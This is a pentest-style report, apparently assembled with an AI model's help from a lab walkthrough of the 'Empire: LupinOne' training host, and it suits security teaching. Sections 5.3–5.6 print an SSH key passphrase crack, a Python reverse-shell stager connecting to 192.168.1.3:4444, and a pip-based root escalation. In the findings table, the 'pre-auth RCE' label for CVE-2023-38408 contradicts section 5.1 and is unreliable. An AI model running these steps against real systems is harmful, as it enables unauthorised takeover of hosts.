# Penetration Testing Report

## Target: "Empire: LupinOne" — Internal Host Assessment

**CONFIDENTIAL**

|  |  |
| --- | --- |
| **Prepared for** | \[Client Name\] |
| **Prepared by** | \[Your Name / Handle\] |
| **Engagement dates** | 15–16 October 2026 |
| **Target host** | 192.168.0.105 (internal lab network) |
| **Assessment type** | Black-box, unauthenticated external-style host assessment |
| **Report classification** | Confidential — for intended recipient only |

> This report is formatted as a portfolio/demo pentest report built from a completed assessment of the publicly available "Empire: LupinOne" training host (originally released by icex64 and Empire Cybersecurity). It is structured the way a client-facing engagement report would be delivered, and can be reused as a template for real engagements.

---

## 1. Executive Summary

During the engagement, a single internal host (192.168.0.105) was assessed for externally exploitable weaknesses. The assessment identified a **critical-risk attack chain** that allowed an unauthenticated attacker to progress from anonymous web access to full **root-level compromise** of the host.

The root cause was a combination of issues rather than one single flaw: a sensitive directory left browsable on the web server exposed a private SSH key; the key's passphrase was weak enough to be cracked offline in under two seconds; the resulting SSH foothold was compounded by an overly permissive `sudo` delegation and a world-writable core Python library file, which together allowed privilege escalation to a second user account; and finally an unrestricted `sudo` entry for the `pip` package manager allowed escalation straight to `root`.

**Overall Risk Rating: Critical.** Every stage of the chain is independently well understood and inexpensive to remediate; none require architectural changes.

---

## 2. Scope of Engagement

- **In scope:** 192.168.0.105 — all TCP services, web application content, and host-level configuration reachable once initial access was obtained.
- **Objective:** Determine whether an external, unauthenticated attacker could obtain unauthorized access to the host, and if so, the maximum level of access achievable.
- **Testing style:** Black-box (no credentials or source code provided at the outset).
- **Out of scope:** Denial-of-service testing, social engineering, physical access.

---

## 3. Methodology

The assessment followed a standard penetration testing lifecycle:

1. **Reconnaissance & Scanning** — service discovery and fingerprinting (Nmap, Nikto)
2. **Enumeration** — web content discovery, directory listing review
3. **Vulnerability Identification** — automated NSE/vulners scanning plus manual verification
4. **Exploitation** — credential recovery and initial access
5. **Privilege Escalation** — lateral movement between local accounts to `root`
6. **Post-Exploitation / Evidence Capture** — flag retrieval to prove impact
7. **Reporting** — this document

> *Note on screenshots:* The original engagement notes referenced a series of inline screenshots (e.g. `Pasted image 20261015233145.png`, `Pasted image 20261016000336.png`, etc.) stored separately. I attempted to pull these automatically from the linked GitHub assets folder, but GitHub blocks automated/robot access to that page, so they could not be retrieved here. Each should be dropped into the **Figure** placeholders below — once this doc has the images, nothing from the original walkthrough will be missing. Easiest path: upload the image files directly in chat and I'll place them exactly where they belong.

---

## 4. Summary of Findings

| # | Finding | Severity | CVSS v3.1 (approx.) |
| --- | --- | --- | --- |
| 1 | Sensitive directory/file listing exposed private SSH key & credential files | Critical | 9.1 |
| 2 | Weak passphrase on exposed SSH private key | High | 7.5 |
| 3 | Outdated OpenSSH 8.4p1 with known pre-auth RCE (CVE-2023-38408) | High | 9.8 |
| 4 | Outdated Apache httpd 2.4.48 with multiple known CVEs | High | 7.5–9.8 |
| 5 | Overly permissive `sudo` delegation between local accounts | Medium | 6.0 |
| 6 | World-writable core Python standard-library file | Critical | 9.8 |
| 7 | Unrestricted `NOPASSWD` sudo rights over `pip` (GTFOBins vector) | Critical | 9.8 |
| 8 | Missing HTTP security headers (CSP, HSTS, X-Content-Type-Options, etc.) | Low | 5.3 |

**Figure 1** — *(insert `Pasted image 20261015233145.png`)* — initial Nmap service scan.

---

## 5. Detailed Findings & Exploitation Narrative

### 5.1 Reconnaissance & Scanning

A full TCP port sweep followed by version/vuln scripting identified two open services:

```
22/tcp open ssh   OpenSSH 8.4p1 Debian 5
80/tcp open http  Apache httpd 2.4.48 (Debian)
```

`robots.txt` disclosed a disallowed path, `/~myfiles`, which is itself a reconnaissance signal — disallow entries are a map of what the site owner doesn't want indexed, not an access control.

A Nikto scan against port 80 confirmed the Apache build was outdated, flagged several missing security headers, and — critically — found **directory indexing enabled** on two paths: `/manual/images/` and `/image/`.

An automated `nmap --script vuln` / vulners sweep flagged a large number of candidate CVEs against both service banners. Automated CPE-based matching is noisy and includes false positives, so each should be triaged individually; two are worth calling out because they are well-documented and version-applicable:

- **CVE-2023-38408** — remote code execution in OpenSSH's `ssh-agent` forwarding, affecting versions prior to 9.3p1 (the installed 8.4p1 is in scope).
- **CVE-2021-44790 / CVE-2021-44224** — Apache `mod_lua` buffer overflow and `mod_proxy` SSRF/DoS, both affecting Apache httpd builds prior to 2.4.51.

The complete raw scanner output (several hundred additional candidate CVE references) is retained in the engagement workpapers and can be supplied as a technical appendix on request.

### 5.2 Finding: Sensitive File Exposure via Directory Listing (Critical)

Because directory indexing was enabled on `/image/`, the web server exposed the contents of that directory to any unauthenticated visitor. Browsing it revealed, among other files, an SSH private key (`id_rsa`), a `users.txt` file, a `Password.txt` file, and a `reverse-shell.php` file left on the webroot.

**Figures 2–5** — *(insert `Pasted image 20261016000336.png`, `20261016000617.png`, `20261016001803.png`, `20261016001829.png`)* — directory listing and exposed file contents.

**Impact:** credential material that should never be reachable over HTTP was retrievable with a single unauthenticated request.

### 5.3 Finding: Weak SSH Key Passphrase (High)

The recovered `id_rsa` was passphrase-protected, but the passphrase was weak enough to be recovered almost instantly with an offline dictionary attack:

```
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt
```

```
P@55w0rd!        (id_rsa)
1g 0:00:00:01 DONE ... 0.5102g/s 65.30p/s
```

The passphrase was cracked in roughly one second because it appears in a small, commonly used wordlist (`fasttrack.txt`) — demonstrating that passphrase strength, not just key length, determines how protective a key really is.

### 5.4 Initial Access

Using the recovered key and passphrase, SSH authentication succeeded as user `icex64`:

```
ssh -o KexAlgorithms=+diffie-hellman-group14-sha256 \
    -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedKeyTypes=+ssh-rsa \
    -i id_rsa icex64@192.168.0.105
```

Note that modern OpenSSH clients disable the `ssh-rsa` host-key/pubkey algorithm and older KEX groups by default; having to explicitly re-enable them is itself a sign the key material and server configuration predate current hardened defaults.

**Figures 6–7** — *(insert `Pasted image 20261016170703.png`, `20261016170855.png`)* — authenticated session as `icex64`.

A user-level flag was retrieved, confirming impact at this stage:

```
user.txt → 3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
```

### 5.5 Privilege Escalation — Sudo Delegation + Python Library Hijacking (Critical)

`sudo -l` showed that `icex64` could run one specific script as a second user, `arsene`, without a password:

```
(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

`heist.py` simply imports the standard-library `webbrowser` module and calls `webbrowser.open()`. A permissions check on that module revealed it was **world-writable**:

```
-rwxrwxrwx 1 root root 24087 Oct 16 07:17 /usr/lib/python3.9/webbrowser.py
```

Because any local user could overwrite a file that every Python 3.9 process on the host implicitly trusts and imports, it was possible to insert a reverse-shell stager directly into `webbrowser.py`. The next time `heist.py` ran — triggered via the permitted `sudo` command — the tampered module executed as `arsene`:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.3",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

**Figures 8–11** — *(insert `Pasted image 20261016180958.png`, `20261016181044.png`, `20261016181107.png`, `20261016181139.png`)* — payload insertion and resulting shell session as `arsene`.

This is a textbook **library-hijacking privilege escalation**: trusting a `sudo` delegation to a script is only as safe as every file that script (and the interpreter running it) touches.

### 5.6 Privilege Escalation — Unrestricted Sudo on `pip` (Critical)

From the `arsene` shell, `sudo` rights included unrestricted, passwordless access to the `pip` package installer — a documented [GTFOBins](https://gtfobins.github.io/gtfobins/pip/) privilege-escalation primitive, since `pip install` executes the `setup.py` of any package it installs:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

Because the install itself ran under `sudo`, the attacker-supplied `setup.py` executed as `root`, handing over an interactive root shell and completing full host compromise.

**Figures (continued)** — any later screenshots from the walkthrough showing the root shell/`id` output should be inserted here to close out the evidence trail.

---

## 6. Risk Rating & Business Impact

The overall engagement risk is rated **Critical**. A single unauthenticated web request was sufficient to begin a chain that ended in `root` access, with no stage requiring advanced exploit development — every step used publicly documented techniques (offline key cracking, GTFOBins, Python import hijacking). Any production system exhibiting even one of these misconfigurations should be treated as compromised-by-design until remediated.

---

## 7. Recommendations

| Finding | Recommendation |
| --- | --- |
| Exposed files via directory listing | Disable directory indexing (`Options -Indexes`); remove credential/backup material from the webroot entirely; audit all web-exposed paths, not just linked ones. |
| Weak key passphrase | Enforce passphrase complexity/length on private keys, or move to hardware-backed / agent-based key storage; rotate any key that was ever exposed. |
| Outdated OpenSSH / Apache | Patch to current stable releases; track CVEs for installed package versions as part of routine vulnerability management. |
| Broad sudo delegation | Scope `sudo` entries to the minimum necessary; avoid `NOPASSWD` where possible; never delegate `sudo` on general-purpose interpreters (`python`, `pip`, `perl`, etc.) — check any proposed rule against GTFOBins first. |
| World-writable system files | Audit `/usr/lib`, `/usr/bin`, and other interpreter/library paths for incorrect permissions as a standard hardening step; file integrity monitoring would have caught this immediately. |
| Missing HTTP security headers | Add CSP, HSTS, X-Content-Type-Options, Referrer-Policy, and Permissions-Policy headers at the web-server or application layer. |

---

## 8. Conclusion

This assessment demonstrates how a handful of individually "minor" misconfigurations — a browsable directory, a weak passphrase, a loose sudoers line, and a writable system file — chain together into full compromise. None of the individual fixes above are costly or disruptive; the value of this engagement is in surfacing the chain before an attacker does.

---

## Appendix A: Tool Output Reference

- `nmap -sV -sC -p- 192.168.0.105` — full port/service scan
- `nmap -sV --script vuln 192.168.0.105` — automated vulnerability/CVE correlation (vulners NSE)
- `nikto -h http://192.168.0.105` — web server misconfiguration scan
- `ssh2john` / `john --wordlist=fasttrack.txt` — offline SSH key passphrase recovery
- Manual enumeration: `id`, `sudo -l`, file permission checks

Full raw logs for each tool are available on request and were used as the evidentiary basis for every finding in Section 5.
